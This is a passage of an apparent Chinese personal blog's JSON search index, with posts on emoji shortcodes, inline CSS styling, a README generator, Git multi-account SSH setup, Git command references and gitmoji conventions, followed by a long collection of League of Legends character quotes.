:arrow_up: ↖️ :arrow_upper_left: ↗️ :arrow_upper_right: ⏬ :arrow_double_down: ⏫ :arrow_double_up: 🔽 :arrow_down_small: ⤵️ :arrow_heading_down: ⤴️ :arrow_heading_up: ↩️:leftwards_arrow_with_hook: ↪️ :arrow_right_hook: ↔️ :left_right_arrow: ↕️ :arrow_up_down: 🔼 :arrow_up_small: 🔃 :arrows_clockwise: 🔄 :arrows_counterclockwise: ⏪ :rewind: ⏩ :fast_forward: ℹ️ :information_source: 🆗 :ok: 🔀 :twisted_rightwards_arrows: 🔁 :repeat: 🔂 :repeat_one: 🆕 :new: 🔝 :top: 🆙 :up: 🆒 :cool: 🆓 :free: 🆖 :ng: 🎦 :cinema: 🈁 :koko: 📶 :signal_strength: 🈹 :u5272: 🈴 :u5408: 🈺 :u55b6: 🈯️ :u6307: 🈷️ :u6708: 🈶 :u6709: 🈵 :u6e80: 🈚️ :u7121: 🈸 :u7533: 🈳 :u7a7a: 🈲 :u7981: 🈂️ :sa: 🚻 :restroom: 🚹 :mens: 🚺 :womens: 🚼 :baby_symbol: 🚭 :no_smoking: 🅿️ :parking: ♿️ :wheelchair: 🚇 :metro: 🛄 :baggage_claim: 🉑 :accept: 🚾 :wc: 🚰 :potable_water: 🚮 :put_litter_in_its_place: ㊙️ :secret: ㊗️ :congratulations: Ⓜ️ :m: 🛂 :passport_control: 🛅 :left_luggage: 🛃 :customs: 🉐 :ideograph_advantage: 🆑 :cl: 🆘 :sos: 🆔 :id: 🚫 :no_entry_sign: 🔞 :underage: 📵 :no_mobile_phones: 🚯 :do_not_litter: 🚱 :non-potable_water: 🚳 :no_bicycles: 🚷 :no_pedestrians: 🚸 :children_crossing: ⛔️ :no_entry: ✳️ :eight_spoked_asterisk: ✴️ :eight_pointed_black_star: 💟 :heart_decoration: 🆚 :vs: 📳 :vibration_mode: 📴 :mobile_phone_off: 💹 :chart: 💱 :currency_exchange: ♈️ :aries: ♉️ :taurus: ♊️ :gemini: ♋️ :cancer: ♌️ :leo: ♍️ :virgo: ♎️ :libra: ♏️ :scorpius: ♐️ :sagittarius: ♑️ :capricorn: ♒️ :aquarius: ♓️ :pisces: ⛎ :ophiuchus: 🔯 :six_pointed_star: ❎:negative_squared_cross_mark: 🅰️ :a: 🅱️ :b: 🆎 :ab: 🅾️ :o2: 💠:diamond_shape_with_a_dot_inside: ♻️ :recycle: 🔚 :end: 🔛 :on: 🔜 :soon: 🕐 :clock1: 🕜 :clock130: 🕙 :clock10: 🕥 :clock1030: 🕚 :clock11: 🕦 :clock1130: 🕛 :clock12: 🕧 :clock1230: 🕑 :clock2: 🕝 :clock230: 🕒 :clock3: 🕞 :clock330: 🕓 :clock4: 🕟 :clock430: 🕔 :clock5: 🕠 :clock530: 🕕 :clock6: 🕡 :clock630: 🕖 :clock7: 🕢 :clock730: 🕗 :clock8: 🕣 :clock830: 🕘 :clock9: 🕤 :clock930: 💲 :heavy_dollar_sign: ©️ :copyright: ®️ :registered: ™️ :tm: ❌ :x: ❗️ :heavy_exclamation_mark: ‼️ :bangbang: ⁉️ :interrobang: ⭕️ :o: ✖️ :heavy_multiplication_x: ➕ :heavy_plus_sign: ➖ :heavy_minus_sign: ➗ :heavy_division_sign: 💮 :white_flower: 💯 :100: ✔️ :heavy_check_mark: ☑️ :ballot_box_with_check: 🔘 :radio_button: 🔗 :link: ➰ :curly_loop: 〰️ :wavy_dash: 〽️ :part_alternation_mark: 🔱 :trident: :black_square: :black_square: :white_square: :white_square: ✅ :white_check_mark: 🔲 :black_square_button: 🔳 :white_square_button: ⚫️ :black_circle: ⚪️ :white_circle: 🔴 :red_circle: 🔵 :large_blue_circle: 🔷 :large_blue_diamond: 🔶 :large_orange_diamond: 🔹 :small_blue_diamond: 🔸 :small_orange_diamond: 🔺 :small_red_triangle: 🔻 :small_red_triangle_down: 显示详细信息","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"前端样式配置 style","date":"2023-10-27T01:24:02.479Z","path":"E_手册/SpanStyleList/","text":"12345678910111213141516171819202122232425262728291&lt;span class=&quot;fas faa-ring animated-hover&quot; style=&quot;border-bottom:3px solid green&quot;&gt;《半小时漫画中国哲学史》&lt;/span&gt;2&lt;span style=&quot;text-align:center;font-size:20px;font:30px 书体坊兰亭体;color:blueviolent;word-spacing:30px;&quot;&gt;“ 既许一人以偏爱，愿尽余生之慷慨 ”&lt;/span&gt;3&lt;span style=&quot;class: faa-bounce animated-hover;border-bottom: 5px solid #8F81EF;&quot;&gt;[data.json文件链接](https://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA )&lt;/span&gt; 4 &lt;mark style=&quot;background:royalBlue;border-bottom:lightblue 2px solid;color:white;font-family:consolas&quot;&gt;当使用重做日志文件来进行数据库恢复时，ORACLE将读取其中的重做记录(包括其中的修改向量)，并且将这些修改用于相关的块中。&lt;/mark&gt;5&lt;span style=&quot;background: PaleVioletRed;border-radius:10px;padding:1px 5px;color:white;font-weight:900&quot;&gt;存储结构管理主要就是通过对表空间的管理来实现的&lt;/span&gt;6&lt;mark style=&quot;background:green;border-radius:10px;color:white&quot;&gt;效果如下：&lt;/mark&gt;7&lt;font size=10px style=&quot;font-weight:700;font-family:&#x27;华文彩云&#x27;;color:rgb(100,190,100)&quot;&gt;基本语言(一)&lt;/font&gt;8&lt;span style=&quot;border-bottom: 2px dashed #000000&quot;&gt;代码段、数据段、BSS段、堆区、文件映射区以及栈区&lt;/span&gt;9&lt;div style=&quot;background:black;font:conloas;color:white;&quot;&gt; 数组长度为：3&lt;br&gt; 请按任意键继续. . .&lt;/div&gt;10&lt;mark style=&quot;color:white;background:red;font-weight:600;border_radius:100px&quot;&gt;但效率更高&lt;/mark&gt;11&lt;details&gt; &lt;summary&gt;更多&lt;/summary&gt; &lt;p&gt;内容&lt;/p&gt;&lt;/details&gt; 1《半小时漫画中国哲学史》 2“ 既许一人以偏爱，愿尽余生之慷慨 ” 3data.json文件链接 4当使用重做日志文件来进行数据库恢复时，ORACLE将读取其中的重做记录(包括其中的修改向量)，并且将这些修改用于相关的块中。 5存储结构管理主要就是通过对表空间的管理来实现的 6效果如下： 7基本语言(一) 8代码段、数据段、BSS段、堆区、文件映射区以及栈区 9 数组长度为：3 请按任意键继续. . . 10但效率更高 11 折叠 更多 1. 列表1 2. 列表2","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"样式","slug":"样式","permalink":"http://example.com/tags/%E6%A0%B7%E5%BC%8F/"},{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"Readme 工具使用手册","date":"2023-10-27T01:24:02.478Z","path":"E_手册/Readme使用手册/","text":"[toc] ReadMe readme 是一个自动生成 readme 的工具 开源项目地址：https://github.com/kefranabg/readme-md-generator 开源项目作者：Franck Abgrall 用法npx 用法Make sure you have npx installed (npx is shipped by default since npm 5.2.0) Just run the following command at the root of your project and answer questions: 1npx readme-md-generator Or use default values for all questions (-y): 1npx readme-md-generator -y Use your own ejs README template (-p): 1npx readme-md-generator -p path/to/my/own/template.md You can find ejs README template examples here.、 Windows 系统使用1readme Or use default values for all questions (-y): 1readme -y Use your own ejs README template (-p): 1readme -p D:my/own/template.md","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"通过 Commit 关闭 Issue","date":"2023-10-27T01:24:02.477Z","path":"E_手册/Git/关闭issue/","text":"[toc] commit关闭issue如果要在相同仓库关闭一个Issue（工单），可以使用下面列表中的关键词并在其后面加上Issue编号的应用（#+issue编号）。 例如一个提交信息中包含 Fixes #45 ，那么一旦这次提交被合并到默认分支，仓库中的45号issue就会自动关闭。 Issue 关键字123456789closeclosesclosedfixfixesfixedresolveresolvesresolved 关闭多个issues如果你在commit的开头使用多个上述关键字加issue的引用的话，你就可以关闭多个issues。例如，This closes #34, closes #23, and closes example_user&#x2F;example_repo#42将会关闭同一个仓库的34和23号issue以及 example_user&#x2F;example_repo 仓库的42号issue。","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"Git","permalink":"http://example.com/tags/Git/"},{"name":"Issue","slug":"Issue","permalink":"http://example.com/tags/Issue/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-手册/Git","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"Git 配置多账号","date":"2023-10-27T01:24:02.476Z","path":"E_手册/Git/Git配置多账号/","text":"[toc] 生成多个密钥 生成多个密钥，生成时修改密钥文件的文件名 1ssh-keygen -t rsa -C &quot;邮箱&quot; 注意上述命令执行完之后第一个输入要求的是输入的保存的文件名 示例： 123456ssh-keygen -t rsa -C &quot;holdyounger@163.com&quot;# 保存的时候可以选择保存文件的名称设置为 fork_hodlyounger_ssh_key# 接着执行另外一个账号ssh-keygen -t rsa -C &quot;公司邮箱&quot;# 保存的时候可以选择保存文件的名称设置为 id_rsa 添加密钥 123456# 切换ssh-agent bash# 添加ssh-add ~/.ssh/fork_hodlyounger_ssh_keyssh-add ~/.ssh/id_rsa 将密钥添加到账户中 使用 cat 查看对应账户的 pub 文件。将其内容添加到账户中。 添加本地配置文件 添加本地配置文件用以区分密钥在哪个git中使用，配置如下所示配置文件更详细的说明可以参考这篇文章 Git：单台电脑同时配置多个git账号 - 怒吼的萝卜 - 博客园 新建config文件，文件内容如下所示。 1234567891011# 这个是我私人的GitHubHost githubHostName github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/fork_hodlyounger_ssh_key# 这个是公司的GitLabHost git-biz.cnHostName git-biz.cnPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa 配置文件补充说明 12345678910111213# 这里是自定义的host简称，以后连接远程服务器就可以用命令ssh myhostHost# 主机名可用ip也可以是域名(如:github.com或者bitbucket.org)HostName# 服务器open-ssh端口（默认：22,默认时一般不写此行）Port# 配置登录时用什么权限认证# 可设为(publickey, password publickey, keyboard-interactive 等)PreferredAuthentications# 证书文件路径（如~/.ssh/id_rsa_*)IdentityFile# 云端仓库登录用户名User 校验 简单点就是ssh： 1ssh -T &quot;holdyoungere@163.com&quot; 返回 Hi (用户名)! You&#39;ve successfully authenticated, but GitHub does not provide shell access. 开头样式的表示添加密钥成功了。","tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"多账号","slug":"多账号","permalink":"http://example.com/tags/%E5%A4%9A%E8%B4%A6%E5%8F%B7/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-手册/Git","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"Git 速查手册","date":"2023-10-27T01:24:02.475Z","path":"E_手册/Git/Git速查手册/","text":"查看远程仓1git remote -v 分支查看12345678# 查看本地分支git branch# 查看远程分支git branch -r# 查看所有分支git branch -a 删除12345678910111213141516171819# 删除远程分支git push origin --delete [branch_name]2. 删除本地分支区别git branch -d 会在删除前检查merge状态（其与上游分支或者与head）。git branch -D 是git branch --delete --force的简写，它会直接删除。共同点都是删除本地分支的方法（与删除远程分支命令相独立，要想本地和远程都删除，必须得运行两个命令）。3. git查看分支：查看本地分支 git branch查看远程分支 git branch -r查看本地和远程分支 git branch -a4.git删除分支：删除本地分支 git branch -d 本地分支名删除远程分支 git push origin --delete 远程分支名推送空分支到远程（删除远程分支另一种实现）git push origin :远程分支 Config12# 查看git configgit config -l stash123git stashgit stash pop 拉取12# 拉取远端分支到本地分支 Develop分支到本地Develop分支git fetch origin Develop:Develop 查看已push但未提交的内容1git cherry -v 合并合并某个分支上的某一个文件 切换到当前分支（即：要合并文件到的分支） 1git checkout current_branch 合并指定分支上的文件到当前分支 1git checkout --patch zhiding_branch f.txt 合并 zhiding_branch 分支上的 f.txt 文件到 current_branch git log 最强语句1git config --global alias.lg &quot;log --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit --date=relative&quot;","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"Git","permalink":"http://example.com/tags/Git/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-手册/Git","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"git emoji手册","date":"2023-10-27T01:24:02.473Z","path":"E_手册/Git/Git emoji手册/","text":"gitmoji | An emoji guide for your commit messages emoji emoji 代码 commit 说明 🎨 (调色板) :art: 改进代码结构 &#x2F; 代码格式 ⚡️ (闪电) 🐎 (赛马) :zap: :racehorse: 提升性能 🔥 (火焰) :fire: 移除代码或文件 🐛 (bug) :bug: 修复 bug 🚑 (急救车) :ambulance: 重要补丁 ✨ (火花) :sparkles: 引入新功能 📝 (备忘录) :memo: 撰写文档 🚀 (火箭) :rocket: 部署功能 💄 (口红) :lipstick: 更新 UI 和样式文件 🎉 (庆祝) :tada: 初次提交 ✅ (白色复选框) :white_check_mark: 更新测试 🔒 (锁) :lock: 修复安全问题 🍎 (苹果) :apple: 修复 macOS 下的问题 🐧 (企鹅) :penguin: 修复 Linux 下的问题 🏁 (旗帜) :checkered_flag: 修复 Windows 下的问题 🤖（机器人） :robot: 修复 Android 下的问题 🍏 (绿苹果) :green_apple: 修复 iOS 下的问题 🔖 (书签) :bookmark: 发行 &#x2F; 版本标签 🚨 (警车灯) :rotating_light: 移除 linter 警告 🚧 (施工) :construction: 工作进行中 👷 (工人) :construction_worker: 添加 CI 构建系统 💚 (绿心) :green_heart: 修复 CI 构建问题 ⬆️ (上升箭头) :arrow_up: 升级依赖 ⬇️ (下降箭头) :arrow_down: 降级依赖 📌 (图钉) :pushpin: 将依赖项固定到特定版本 📈 (上升趋势图) :chart_with_upwards_trend: 添加分析或跟踪代码 ♻️ （回收） :recycle: 重构代码 🐳 (鲸鱼) :whale: Docker 相关工作 🌐 (带子午线的地球仪) :globe_with_meridians: 国际化与本地化 ➕ (加号) :heavy_plus_sign: 增加一个依赖 ➖ (减号) :heavy_minus_sign: 减少一个依赖 🔧 (扳手) :wrench: 修改配置文件 🔨 (锤子) :hammer: 重大重构 ✏️ (铅笔) :pencil2: 修复 typo 💩 (粑粑…) :hankey: 写了辣鸡代码需要优化 ⏪ (倒带) :rewind: 恢复更改 🔀 (交叉向右的箭头) :twisted_rightwards_arrows: 合并分支 📦 (包裹) :package: 更新编译的文件或包 👽 (外星人) :alien: 由于外部 API 更改而更新代码 🚚 (货车) :truck: 移动或者重命名文件 📄 (正面朝上的页面) :page_facing_up: 增加或更新许可证书 💥 (爆炸) :boom: 引入突破性的变化 🍱 (铅笔) :bento: 增加或更新资源 👌 (OK 手势) :ok_hand: 由于代码审查更改而更新代码 ♿️ (轮椅) :wheelchair: 改善无障碍交互 💡 (灯泡) :bulb: 给代码添加注释 🍻 (啤酒) :beers: 醉醺醺地写代码… 💬 (消息气泡) :speech_balloon: 更新文本文档 🗃 (卡片文件盒) :card_file_box: 执行与数据库相关的更改 🔊 (音量大) :loud_sound: 增加日志 🔇 (静音) :mute: 移除日志 👥 (轮廓中的半身像) :busts_in_silhouette: 增加贡献者 🚸 (孩童通行) :children_crossing: 优化用户体验、可用性 🏗 (建筑建造) :building_construction: 结构变动 📱 (iPhone) :iphone: 做响应式设计 🤡 (小丑脸) :clown_face: 嘲弄事物（直译，这个没明白） 🥚 (鸡蛋) :egg: 增加彩蛋 🙈 (看不见邪恶) :see_no_evil: 增加或更改 gitignore 📸 (照相机闪光灯) :camera_flash: 增加或更新截图 ⚗️ (蒸馏器) :alembic: 尝试新东西 🔍 (放大镜) :mag: SEO 优化 ☸️ (船的方向盘) :wheel_of_dharma: 关于 Kubernetes 的工作 🏷 (标签) :label: 增加类型（FLow、Typescript） 🌱(听诊器) :seedling: 添加或更新种子文件 🧵 (毛线圈) :thread: 添加或更新与多线程或并发性相关的代码 🦺(安全马甲) :safety_vest: 添加或更新与验证相关的代码 🧑‍💻(程序) :technologist: 改善开发者体验 :technologist: 🧱(砖) :bricks: 基础设施相关的变化 🩺(听诊器) :stethoscope: 添加或更新运行状况检查 👔(衬衫) :necktie: 添加或更新业务逻辑 🧪(试管) :test_tube: 添加失败的测试 ⚰️(棺椁) :coffin: 删除死代码 🧐(观察) :monocle_face: 数据探索&#x2F;检查 🩹(创可贴) :adhesive_bandage: 简单修复非关键问题 🛂(鉴权) :passport_control: 处理与授权、角色和权限相关的代码 🗑️(垃圾桶) :wastebasket: 需要清理的废弃代码 💫(动画) :dizzy: 添加或更新动画和过渡 🥅(足球门) :goal_net: 捕获异常 🚩(旗帜) :triangular_flag_on_post: 添加、更新或删除功能标志","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-手册/Git","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"英雄联盟语录","date":"2023-10-27T01:24:02.472Z","path":"E_手册/Game/LOL/","text":"仁义道德，也是一种奢侈。——亚索 千军万马一将在，探囊取物有何难。——皇子 落叶的一生，只是为了归根么。——亚索 我对你的爱就如闪电，狂暴而剧烈，飞出的飞镖，是我向你传达的思念。——狂暴之心 且听风吟，御剑于心。——亚索 一曲终了，繁花散尽，伊人已逝，只余一声空叹。——死亡颂唱者 我只是部落遗子，你确是高贵公主，我愿把我生命的力量化为三刀为你而战，只为证明我，配的上你。——蛮族之王 我对你的爱就如闪电，狂暴而剧烈，飞出的飞镖是向你传达的思念。——狂暴之心 无情的岁月慢慢的侵蚀你我的生命，在这尽头请允许我为你弹下那回忆的肖邦。——琴瑟仙女 从我手中脱离的刀刃一直在飞舞，我不断的变强，只是为了守护我们的家园，我等候你的归来。——刀锋意志 放马过来吧！你会死的很光荣的！——盖伦 即使一无所有，也要未雨绸缪！——法外狂徒 征战沙场，只为守护我们的家园。只为解甲归田后，可以在墓前守护你一辈子。——德邦 我们不受岁月左右。——马尔扎哈 我可以想去哪就去哪，但是我只想进入你的心里。——祖安狂人 想要再来一发吗，我可不会留下任何悬念。——女警 体型并不能说明一切！——提莫 妩媚倾城的面容，我蛊惑万千众生，孰不知，心里，早有了一个人。却只能无尽的思念，你送我的宝珠，我一直带着，只因为我能看见你的身影。——九尾妖狐 规则就是用来打破的！——金克丝 你的遗体将慢慢消散，化为永恒，就像沙漠中的沙砾那样。——狗头 不管是怎么样的天气，不管是什么样的环境，不管有什么样的危险，我的伙伴，雪人，一直都会陪着我。——雪人骑士 世界上最痛苦的事情，莫过于爱你，却不能对你说出，我只能倾注于我的琴，让我的旋律诉说我的爱。——琴瑟仙女 下了手中的武器，我知道你已厌倦。目送你离开，我亮起黄昏的路灯，照亮你回家的路。——武器大师 他们会像迎接英雄一般迎接你们。——暗裔剑魔 这个故事还没有完结。——亚索 我宁愿犯错误，也不愿什么都不做。——艾克 断剑重铸之日，其势归来之时！——瑞文 我追逐的是你的背影，我跟随的是你的微笑，就算暴风雨到来我依然能在你左右。——雷霆咆哮 只有蠢货才会犹豫不决。——卡特琳娜 入体冰凉的月光都比不上你绝情的目光，为了击碎你伪装的表面，我只能用尽全身力气挥出那惊鸿的半月弧光。——皎月女神 念当年有爱的我，可惜啊，你们看不到啦。——水晶先锋 夜，雪花飘落；我，孤独风中；凛冽的寒风，割裂着我的皮肤。不知绝对的零度是否能冻结对你的思念。——雪人骑士 人生最痛苦的事莫过于你明知要失去，却还没发生。——基兰 即使是一无所有的人也会为自己所珍惜的一切而献出生命。——暗裔剑魔 人们向往天堂，可天堂没有你。于是我堕落凡间追寻你的脚步，只因有你的地方才是天堂。——堕落天使 这只是一场战役，而我，已经赢下了战争！——丽桑卓 我来自深海，我没有朋友，大家都不和我玩，只有巨鲨是我的朋友，你愿意和它一起玩吗？——潮汐海灵 征战沙场，只为守护我们的家园。只为解甲归田后，可以在墓前守护你一辈子。——德邦总管 哼，一个能打的都没有！——武器大师 别看我的眼睛，里面只有愤怒和痛苦。我诅咒着一切，也诅咒着自己。——魔蛇之拥 我一直急速前行，穿梭于人人之间，试图叫应接不暇的风景让我褪去对你的思念。——无极剑圣 太阳不会揭露真相。它的光芒只会让人灼伤和致盲。——黛安娜 我一直急速前行穿梭于人人之间试图叫应接不暇的风景让我褪去对你的思念——无极剑圣 死后能做的最棒的事情是什么？就是碾碎你的敌人，看着他们先你一步而去，并聆听他们怯懦的哭喊。——赛恩 你有一双摄人心魄的眼睛。我非常喜欢。——赏金猎人 命运已做出了它的选择！——赵信 你总说我太小，但是出现危险我都会跳跃到你身边，将危险推开。用手中的炮筒，守护我小小的爱。——麦林炮手 你们不能逮捕我，我爹是瓦罗兰的抗把子。——奥拉夫 悄悄的我走了，正如我悄悄的来；我摸一摸戒指，再带走一次五杀。——剑圣 你们知道最强的武器是什么？没错，就是补丁！——武器大师 我在时光中穿梭，只为找回曾经美好的时光。——时光守护者 你们这种战斗力，我建议你们还是投降算了。——拉克丝 炙热的铁拳砸不开你面前的牢笼，不甘放弃的努力，只为了有一天能砸开牢笼见你一面。——皮城执法官 想攻击我？先试试和影子玩拳击吧。——暗夜猎手 我疯狂的奔跑，只想为你承受一切的伤害，我竖起了山丘，不愿你看见我丑陋的脸庞。——诅咒巨魔 哪一个比较沉重，你的剑刃，还是你的过去？——亚索 物是人非，可我依旧穿着嫁衣，在黑夜中寻找你的身影。你我的约定我一直记得，那一道道璀璨的光束，都是为你所亮。——寡妇制造者 断剑可以重铸，破镜是否可以重圆？心碎可以可以无痕？——放逐之刃 不要测试你的运气，召唤师！——卡特琳娜 曾经，我们错过了，但是，我希望你的未来有我，有我来守护着你。——未来守护者 没有你的世界，我感到孤独。我一次次地想随你而去，但是又一次次地重生。长生不死对我而言是一件多么痛苦的事情。——暗裔剑魔 吾之荣耀，离别已久。——亚索 这场流星雨，只是想给你看，没想到却是伤害了你。——众星之子 你将忘记呼吸，你将忘记爱情。——卡尔萨斯 在瓦罗兰，我是一个无恶不作的大海盗。而成为海盗的原因是为你保驾护航。——海盗船长 外表可是具有欺骗性的。——妖姬 那拿枪的海盗，是记忆里的核心；浩空里的流星，在我的脑海闪过。——赏金猎人 守护你是我最后的希望，束缚着的是思念，丢弃的是无奈，最后我会留下一个圈摆放你我的回忆，直到我也干枯，你也远去！——扭曲树精 时间不在于你拥有多少，而在于你怎样使用。——艾克 我每向你射出一支箭，便代表我对你的爱多一分，而你，是否会接受我万千的爱？——寒冰射手 我一直急速前行，穿梭于人人之间。试图借应接不暇的风景让我褪去对你的思念。——无极剑圣 死亡如风，常伴吾身。——亚索 顺我者昌，逆我者亡，此乃天意。——卡牌 即使丑陋的外表也掩盖不了我对召唤师的感激之情，即使在很危险的情况下我也会挺身而出。——诅咒巨魔 那双枪下的弹幕，不是烟花，是琴上律；爆发在好运间，释放着海盗似的野。——赏金猎人 人终归是要死的，为什么不选择一种死亡的方式呢？——卡尔萨斯 过去那个爱笑的我已经不在了，现在的我只剩下魔法与记忆以及这个丑陋不堪的身躯，孤独的在这个世界徘徊。——水晶先锋 这不仅仅只是屠杀，而是我的杰作。——暗裔剑魔 我是一个影子，当我潜入阴影之中，没有人能够看见我，但是我希望你是个例外！——影流之主 甲板上的脚印，稳稳的在船上蔓延；在碧海的波浪里，我如愿做一条飞鱼！——赏金猎人 朋友，有我在你就是不死的。即使我死了。也要让你活着离开。——众星之子 我没有过多的抱怨，漫天的乌鸦都是我的朋友，有这个，就足够了——末日使者 我的剑比什么都重要，除了美酒。——亚索 我也希望变成蝴蝶的那一天，不再灰色，不再痛苦。不会再让我丑陋的外表吓到美丽的你。——深渊巨口 我愚蠢的以为，头上的金箍圈可以圈住你所有的爱，可惜我手中的金箍棒改变不了那个开始，也决定不了这个结局，根本没有齐天大圣，我只是一只猴子。——齐天大圣 冰冷的锁链，无情的束缚，黑色的羽毛，血色的双眼，所有的一切都是因为那颗冷寂的心。——堕落天使 狂野将使他们感到畏惧。——豹女 我不顾一切的冲出去……为你开辟一条安稳的路。我满腔热血的拍打着……为你抛开任何绊脚的石。最后，我坦然微笑着用躯体为你抵挡一切……因为我的身体上旋转着我们的誓言！——牛头酋长 我不会怀着耻辱而死！——亚索 断刃可以修复，残心如何弥补。——放逐之刃 冰封千年的心，只为等待那瞬间的融化。日夜凄美的呼唤。也换不回你微笑的回眸。——冰晶凤凰 树叶的一生只是为了归根么？——疾风剑豪 闭上眼睛，你会看到更多。——仙灵女巫璐璐 炽热的铁拳砸不开你面前的牢笼，不甘放弃的努力，只为了有一天能砸开牢笼见你一面。——皮城执法官蔚 我能在空气中嗅到敌人的味道，我很努力了，可是，为什么还是找不到你的踪迹呢！——嗜血猎手 放下了手中的武器，我知道你已厌倦，目送你离开，亮起黄昏的路灯，照亮你回家的路。——武器大师 你一直在畏惧我的毒刺，别怕，让我用我的毒刺把你牵引到我的身边。——水晶先锋 追逐的是你的背影，我跟随的是你的微笑，就算黑夜到来我依然能在你左右。——永恒梦魇 我日复一日地把自己弄得伤痕累累，只是为了看到你为我查看伤口时的柔情。——阿木木 像英雄一样战斗，或者像懦夫一样死去。——暗裔剑魔 我和战争一样永恒。——暗裔剑魔 我筑起高墙，只为了跟你锁在一起，不离不弃。——皇子 谁说笑着就是愉悦，在我微笑的面具下，是已为你风干了伤痕的心，之所以逗万千人开心，只不过是为了等你转世之后对我的，轻浅一笑。——恶魔小丑 明日安在，无人能允。——亚索 在无人注视的角落，独自默默的弹奏。琴音带着我的思恋，妄图拉住你转身而去的袖角。——琴瑟仙女 生命，不过只是一场骗局，从你开始呼吸的那一刻起，你就已经在慢慢死亡了。——死亡颂唱者 这场战争，将会是我的杰作！——暗裔剑魔 无形之刃，最为致命。——劫 妩媚倾城的面容，我蛊惑万千众生。殊不知心里早有了一个人，却只能无尽的思念。你送我的宝珠我一直带着，只因为我能看见你的身影。——九尾妖狐 永远不要质疑我的忠诚，你不会了解我为之忍受的一切。——卡特琳娜 如果你赢不了，试试换一把大点的剑！通常都有用。——咆啸深渊 我披上坚甲，挡在你前面。万千的关心，只化为一句小心。——披甲龙龟 大地的融化，海水的暴涨，星辰的坠落。我虚空的眼睛无法先知你的足迹。——虚空先知 我在时空中穿梭，只为找回曾经美好的时光……——时光老人 在诺克萨斯有一个残忍的杀手，但是你们都不明白他其实是为了国家在战斗，他的苦楚有几人懂？——诺克萨之手 有我在就不允许别人伤害你，即使我死了，也要你活着离开。——众星之子 刀光剑影，铁石心肠，只有你知道在隐雾下的我，还是那么脆弱，容易感伤。——刀锋之影 如果我俩角色互换，我会让你看看，什么叫残忍！——维嘉 我没有过多的抱怨，漫天的乌鸦都是我的朋友，有这个，就足够了。——末日使者 世间万物，表里如一者，又有几何？——婕拉 卑微的我拿起手弩隐匿在你的左右，守护着你，即使你永远也不知道。——瘟疫之源 每一张牌，都是对你的思念。我赌赢了所有，却赢不回你的爱。——卡牌大师 那手中的冥火，是坦克中的噩梦；无极里的鬼影，在我的身边穿梭。——剑圣 每一张牌，都是对你的一份思念，我赌赢了所有，却赢不回你的爱。——卡牌大师 行走于虚空，我彷徨，我迷茫。我不知何去何从，只有飘飘荡荡。——虚空行者 不要错把仁慈当做弱小。——冰女 我们该怎么进行，这令人预约的折磨呢？——魂锁典狱长 我一路种下了蘑菇，只为让你知道回家的路。——迅捷斥候 邪恶的外表，其实并不是我的内心。你总是说我困住了你，你会为我停留么？——邪恶小法师 心怀恐惧的死去，或者手染鲜血的获胜。——暗裔剑魔 恩……你们的肉非常可口。–嗜血猎手 我是一个影子，当我潜入阴影之中，没有人能够看见我，但是，我希望你是个例外！–影流之主 液压系统已开启。–首领之傲 我披上坚甲，挡在你的身前，万千的关心只化为一句：小心。–披甲龙龟 让我们合伙干吧！–猩红收割者 要协调。–琴瑟仙女 你一直在畏惧我的毒刺，别怕，让我用我的毒刺把你牵引到我的身边。–水晶先锋 我敢打赌，你的味道和鸡肉差不多。–策士统领 众星啊……我……回来……了……–众星之子 面具的笑容，遮挡不住我的悲伤，谁能看到我面具下的眼泪。–恶魔小丑 妩媚倾城的面容，我蛊惑万千众生，孰不知心里早已有了一个人，却只能无尽的思念，你送我的宝珠我一直带着，只因为我能看见你的身影。–九尾妖狐 你要来几发么？–寒冰射手 野性的本能，指引着我们的拳头。–野兽之灵 血块变厚了。–猩红收割者 我可以在空气中嗅到敌人的味道，我很努力了，可是，为什么还是找不到你的踪迹。–嗜血猎手 我们的本能如同剃刀般锋利！–野兽之灵 命运已做出了它的选择！–德邦总管 恶作剧的对象，是你哟！–恶魔小丑 没错，我知道我让你无法呼吸。–风暴女神 在无尽的虚空中，我感到了前所未有的孤独，我可以掠夺任何生命，但是却掠夺他们的心。–虚空掠夺者 现在他们可以死了！–蛮族之王 听我说，召唤师。我并没有兄弟，也不认识特斯拉！我的瞬移以及分身靠的都是魔法！–恶魔小丑 我的剑刃不但准，而且狠！–刀锋意志 愿意送我点血吗？–猩红收割者 艾欧尼亚不会灭亡。–刀锋意志 